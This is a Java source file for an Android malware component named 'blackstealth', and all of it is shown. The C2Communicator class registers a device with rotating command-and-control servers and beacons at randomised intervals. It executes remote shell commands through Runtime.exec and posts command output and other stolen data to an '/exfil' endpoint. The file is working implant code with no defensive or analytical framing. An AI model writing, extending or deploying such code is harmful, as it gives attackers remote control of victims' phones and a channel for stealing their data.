package com.offensive.blackstealth.core;

import android.util.Base64;
import android.util.Log;
import java.io.*;
import java.net.*;
import java.util.*;
import java.util.concurrent.*;
import javax.net.ssl.*;

/**
 * C2Communicator - Handles communication with Command & Control server
 */
public class C2Communicator {
    private static final String TAG = "C2Communicator";
    
    private List<String> c2Servers;
    private int currentServerIndex = 0;
    private String deviceId;
    private String registrationId;
    private boolean isRegistered = false;
    private ExecutorService executor;
    private CommandHandler commandHandler;
    private long beaconInterval = 60000; // 1 minute
    private boolean isRunning = false;
    
    public interface CommandHandler {
        String handleCommand(String command);
    }
    
    public C2Communicator(List<String> servers, String deviceId) {
        this.c2Servers = new ArrayList<>(servers);
        this.deviceId = deviceId;
        this.executor = Executors.newFixedThreadPool(3);
    }
    
    public void setCommandHandler(CommandHandler handler) {
        this.commandHandler = handler;
    }
    
    /**
     * Start the C2 communication loop
     */
    public void start() {
        if (isRunning) return;
        isRunning = true;
        
        executor.submit(() -> {
            // Initial registration
            while (!isRegistered && isRunning) {
                if (register()) {
                    Log.i(TAG, "Registered with C2: " + registrationId);
                } else {
                    rotateServer();
                    try { Thread.sleep(5000); } catch (Exception e) {}
                }
            }
            
            // Beacon loop
            while (isRunning) {
                try {
                    beacon();
                    Thread.sleep(beaconInterval + (long)(Math.random() * 10000));
                } catch (Exception e) {
                    Log.e(TAG, "Beacon failed: " + e.getMessage());
                    rotateServer();
                }
            }
        });
    }
    
    public void stop() {
        isRunning = false;
        executor.shutdownNow();
    }
    
    /**
     * Register with C2 server
     */
    private boolean register() {
        try {
            String url = getCurrentServer() + "/register?device_id=" + deviceId;
            String response = httpGet(url);
            
            if (response != null && response.contains("registration_id:")) {
                registrationId = response.split(":")[1].trim();
                isRegistered = true;
                return true;
            }
        } catch (Exception e) {
            Log.e(TAG, "Registration failed: " + e.getMessage());
        }
        return false;
    }
    
    /**
     * Beacon to C2 and get commands
     */
    private void beacon() throws Exception {
        String url = getCurrentServer() + "/command?device_id=" + deviceId + 
                    "&registration_id=" + registrationId;
        String response = httpGet(url);
        
        if (response != null && response.contains("commands:")) {
            String[] lines = response.split("\n");
            for (int i = 1; i < lines.length; i++) {
                String command = lines[i].trim();
                if (!command.isEmpty()) {
                    processCommand(command);
                }
            }
        }
    }
    
    /**
     * Process command from C2
     */
    private void processCommand(String command) {
        executor.submit(() -> {
            String result;
            try {
                if (commandHandler != null) {
                    result = commandHandler.handleCommand(command);
                } else {
                    result = executeDefaultCommand(command);
                }
                sendResult(command, result);
            } catch (Exception e) {
                sendResult(command, "Error: " + e.getMessage());
            }
        });
    }
    
    /**
     * Execute built-in commands
     */
    private String executeDefaultCommand(String command) throws Exception {
        if (command.startsWith("shell:")) {
            String cmd = command.substring(6);
            Process p = Runtime.getRuntime().exec(cmd);
            BufferedReader reader = new BufferedReader(new InputStreamReader(p.getInputStream()));
            StringBuilder output = new StringBuilder();
            String line;
            while ((line = reader.readLine()) != null) {
                output.append(line).append("\n");
            }
            return output.toString();
        } else if (command.equals("info")) {
            return "device_id=" + deviceId + "\nregistration_id=" + registrationId;
        } else if (command.startsWith("sleep:")) {
            beaconInterval = Long.parseLong(command.substring(6)) * 1000;
            return "Beacon interval set to " + beaconInterval + "ms";
        }
        return "Unknown command: " + command;
    }
    
    /**
     * Send command result to C2
     */
    public void sendResult(String command, String result) {
        try {
            String data = "device_id=" + deviceId + 
                         "&data_type=command_result" +
                         "&data=" + URLEncoder.encode(result, "UTF-8");
            httpPost(getCurrentServer() + "/exfil", data);
        } catch (Exception e) {
            Log.e(TAG, "Failed to send result: " + e.getMessage());
        }
    }
    
    /**
     * Send exfiltrated data to C2
     */
    public void exfiltrateData(String dataType, String data) {
        executor.submit(() -> {
            try {
                String payload = "device_id=" + deviceId + 
                               "&data_type=" + dataType +
                               "&data=" + URLEncoder.encode(data, "UTF-8");
                httpPost(getCurrentServer() + "/exfil", payload);
            } catch (Exception e) {
                Log.e(TAG, "Exfiltration failed: " + e.getMessage());
            }
        });
    }
    
    private String httpGet(String urlString) throws Exception {
        URL url = new URL(urlString);
        HttpURLConnection conn = (HttpURLConnection) url.openConnection();
        conn.setRequestMethod("GET");
        conn.setConnectTimeout(10000);
        conn.setReadTimeout(10000);
        
        if (conn.getResponseCode() == 200) {
            BufferedReader reader = new BufferedReader(
                new InputStreamReader(conn.getInputStream()));
            StringBuilder response = new StringBuilder();
            String line;
            while ((line = reader.readLine()) != null) {
                response.append(line).append("\n");
            }
            reader.close();
            return response.toString().trim();
        }
        return null;
    }
    
    private void httpPost(String urlString, String data) throws Exception {
        URL url = new URL(urlString);
        HttpURLConnection conn = (HttpURLConnection) url.openConnection();
        conn.setRequestMethod("POST");
        conn.setDoOutput(true);
        conn.setConnectTimeout(10000);
        conn.setReadTimeout(10000);
        
        OutputStream os = conn.getOutputStream();
        os.write(data.getBytes());
        os.flush();
        os.close();
        
        conn.getResponseCode();
        conn.disconnect();
    }
    
    private String getCurrentServer() {
        return c2Servers.get(currentServerIndex);
    }
    
    private void rotateServer() {
        currentServerIndex = (currentServerIndex + 1) % c2Servers.size();
        Log.i(TAG, "Rotating to server: " + getCurrentServer());
    }
    
    public void setBeaconInterval(long intervalMs) {
        this.beaconInterval = intervalMs;
    }
    
    public boolean isRegistered() {
        return isRegistered;
    }
}
